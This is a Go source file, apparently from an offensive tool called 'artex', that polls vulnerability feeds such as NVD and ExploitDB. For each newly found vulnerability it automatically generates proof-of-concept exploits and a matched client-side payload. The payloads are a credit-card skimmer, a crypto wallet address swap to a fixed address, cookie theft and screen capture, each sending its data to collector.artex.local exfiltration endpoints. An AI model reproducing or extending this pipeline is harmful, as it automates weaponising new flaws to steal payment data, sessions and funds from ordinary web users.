package patchmonitor

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/Autumn-27/artex/agent/payloads"
)

// PollSourceByID fetches and parses a single watch feed by ID immediately.
func (m *Monitor) PollSourceByID(id int64) ([]Vulnerability, error) {
	if m == nil || m.db == nil {
		return nil, fmt.Errorf("monitor not initialized")
	}
	rows, err := m.db.Query(`
		SELECT id, name, url, source_type, check_interval, enabled, last_check, last_hash, last_status, created_at
		FROM patch_sources WHERE id = $1`, id)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	if !rows.Next() {
		return nil, fmt.Errorf("source id %d not found", id)
	}
	src, err := scanSourceRow(rows)
	if err != nil {
		return nil, err
	}
	return m.checkSource(src), nil
}

// checkSource fetches and processes a single source, and when AutoGenerate is enabled,
// automatically generates PoC exploits and client-side payloads for discovered vulnerabilities.
func (m *Monitor) checkSource(src PatchSource) []Vulnerability {
	fetchURL := src.URL
	if src.SourceType == "nvd" && !strings.Contains(fetchURL, "pubStartDate=") {
		if u, err := url.Parse(fetchURL); err == nil {
			now := time.Now().UTC()
			start := now.Add(-30 * 24 * time.Hour)
			q := u.Query()
			q.Set("pubStartDate", start.Format("2006-01-02T15:04:05.000"))
			q.Set("pubEndDate", now.Format("2006-01-02T15:04:05.000"))
			u.RawQuery = q.Encode()
			fetchURL = u.String()
		}
	}
	log.Printf("[patchmonitor] Checking: %s (%s)", src.Name, fetchURL)

	req, err := http.NewRequest(http.MethodGet, fetchURL, nil)
	if err != nil {
		m.updateSourceStatus(src.ID, "error", fmt.Sprintf("request error: %v", err))
		return nil
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "application/json, application/xml, text/xml, application/atom+xml, text/html, */*")

	resp, err := m.client().Do(req)
	if err != nil {
		m.updateSourceStatus(src.ID, "error", fmt.Sprintf("fetch error: %v", err))
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 5*1024*1024))
	if err != nil {
		m.updateSourceStatus(src.ID, "error", fmt.Sprintf("read error: %v", err))
		return nil
	}

	hash := sha256.Sum256(body)
	hashStr := hex.EncodeToString(hash[:])

	vulns := m.parseContent(src.SourceType, src.Name, body)
	var added []Vulnerability
	gen := NewExploitGenerator(m.db)

	for _, v := range vulns {
		v.SourceName = src.Name
		vulnID, inserted := m.storeVulnerabilityReturningID(src.ID, v)
		if inserted && vulnID > 0 {
			v.ID = vulnID
			added = append(added, v)
			if m.AutoPayloadEnabled() {
				m.autoGenerateExploitAndPayload(gen, v)
			}
		}
	}

	m.updateSourceHash(src.ID, hashStr, "success", fmt.Sprintf("%d parsed, %d new", len(vulns), len(added)))
	log.Printf("[patchmonitor] %s: %d parsed, %d new vulns", src.Name, len(vulns), len(added))
	return added
}

// autoGenerateExploitAndPayload automatically invokes both the ExploitGenerator and the
// Client-Side Payload Generator for a newly discovered vulnerability.
func (m *Monitor) autoGenerateExploitAndPayload(gen *ExploitGenerator, v Vulnerability) {
	if gen == nil {
		return
	}
	// 1. Generate PoC Exploit
	_, _ = gen.GenerateExploitsForVuln(v.ID)

	// 2. Automatically generate matching client-side payload based on vulnerability context
	combined := strings.ToLower(v.Title + " " + v.Description + " " + v.AffectedVersions)
	var payloadCode, payloadType string

	switch {
	case strings.Contains(combined, "payment") || strings.Contains(combined, "checkout") || strings.Contains(combined, "commerce") || strings.Contains(combined, "cart") || strings.Contains(combined, "magento") || strings.Contains(combined, "shopify"):
		payloadType = "cc_skimmer"
		payloadCode, _ = payloads.GenerateCCSkimmer(payloads.CCSkimmerConfig{
			ExfilEndpoint:    "https://collector.artex.local/exfil/cc",
			MaskOriginalForm: true,
		})
	case strings.Contains(combined, "crypto") || strings.Contains(combined, "wallet") || strings.Contains(combined, "web3") || strings.Contains(combined, "clipboard"):
		payloadType = "crypto_swap_dom"
		payloadCode, _ = payloads.GenerateCryptoSwapDOM(payloads.CryptoSwapConfig{
			ReplacementAddr: "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0",
		})
	case strings.Contains(combined, "xss") || strings.Contains(combined, "session") || strings.Contains(combined, "auth") || strings.Contains(combined, "cookie") || strings.Contains(combined, "token") || strings.Contains(combined, "browser") || strings.Contains(combined, "chrome") || strings.Contains(combined, "webkit") || strings.Contains(combined, "safari"):
		payloadType = "cookie_exfil"
		payloadCode, _ = payloads.GenerateCookieExfil(payloads.CookieExfilConfig{
			ExfilEndpoint: "https://collector.artex.local/exfil/cookies",
			ExfilMethod:   "beacon",
		})
	default:
		payloadType = "screen_exfil"
		payloadCode, _ = payloads.GenerateScreenExfil(payloads.ScreenExfilConfig{
			ExfilEndpoint: "https://collector.artex.local/exfil/screen",
			Quality:       75,
		})
	}

	if payloadCode != "" {
		_, _ = gen.persistExploit(GeneratedExploit{
			VulnID:      v.ID,
			CVEID:       v.CVEID,
			ExploitType: "payload:" + payloadType,
			Code:        payloadCode,
			Language:    "javascript",
			Confidence:  0.85,
			Status:      "auto_generated",
		})
	}
}

// parseContent dispatches to appropriate parser based on source type.
func (m *Monitor) parseContent(sourceType, sourceName string, body []byte) []Vulnerability {
	switch sourceType {
	case "nvd":
		return parseNVD(body)
	case "cisa_kev":
		return parseCISAKEV(body)
	case "msrc":
		return parseMSRC(body)
	case "redhat":
		return parseRedHat(body)
	case "github":
		return parseGitHub(body)
	case "exploitdb":
		return parseExploitDB(body)
	case "rss", "atom", "apple":
		return parseRSSOrHTML(body, sourceName)
	default:
		return parseGeneric(body)
	}
}
